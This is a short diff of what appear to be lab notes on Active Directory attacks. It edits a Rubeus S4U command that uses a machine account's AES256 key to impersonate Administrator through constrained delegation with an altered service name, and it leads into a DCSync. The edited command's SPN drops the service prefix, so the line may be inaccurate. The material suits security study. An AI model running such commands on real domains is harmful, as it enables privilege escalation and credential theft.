@@ -32,7 +32,7 @@ We can change the protocol/service being accessed for the SPN. This is due to th
 
 Rubeus and the `/altservice` parameter
 ```powershell
-.\Loader.exe -path .\Rubeus.exe -args s4u /user:dcorp-adminsrv$ /aes256:e9513a0ac270264bb12fb3b3ff37d7244877d269a97c7b3ebc3f6f78c382eb51 /impersonateuser:Administrator /msdsspn:"time/dcorp-dc.dollarcorp.moneycorp.LOCAL" /altservice:ldap /ptt
+C:\Users\Public\Loader.exe -path C:\Users\Public\Rubeus.exe -args s4u /user:dcorp-adminsrv$ /aes256:e9513a0ac270264bb12fb3b3ff37d7244877d269a97c7b3ebc3f6f78c382eb51 /impersonateuser:Administrator /msdsspn:"mgmtsrv.tech.finance.corp" /altservice:http /ptt
 ```
 
 Now run a DCSync 
